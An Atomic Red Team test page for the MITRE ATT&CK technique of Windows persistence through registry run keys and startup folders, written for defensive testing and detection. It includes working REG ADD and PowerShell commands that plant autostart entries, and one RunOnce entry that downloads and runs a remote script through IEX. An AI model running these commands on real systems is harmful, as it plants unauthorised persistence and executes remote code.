# T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following run keys are created by default on Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Reg Key Run
Run Key Persistence

Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. 

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
```

Invoke-AtomicTest T1547.001 -TestNumbers 1

### Atomic Test #2 - Reg Key RunOnce
RunOnce Key Persistence.

Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. 

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
```

Invoke-AtomicTest T1547.001 -TestNumbers 2

### Atomic Test #3 - PowerShell Registry RunOnce
RunOnce Key Persistence via PowerShell
Upon successful execution, a new entry will be added to the runonce item in the registry.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
```

Invoke-AtomicTest T1547.001 -TestNumbers 3

### Atomic Test #4 - Suspicious vbs file run from startup Folder
vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, "T1547.001 Hello, World VBS!" will be displayed twice. 
Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
folder and will also run when the computer is restarted and the user logs in.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
```

Invoke-AtomicTest T1547.001 -TestNumbers 4

### Atomic Test #5 - Suspicious jse file run from startup Folder
jse files can be placed in and ran from the startup folder to maintain persistance.
Upon execution, "T1547.001 Hello, World JSE!" will be displayed twice. 
Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
folder and will also run when the computer is restarted and the user logs in.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
```

Invoke-AtomicTest T1547.001 -TestNumbers 5

### Atomic Test #6 - Suspicious bat file run from startup Folder
bat files can be placed in and executed from the startup folder to maintain persistance.
Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
folder and will also run when the computer is restarted and the user logs in.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
```

Invoke-AtomicTest T1547.001 -TestNumbers 6

## Detection
Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.

Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.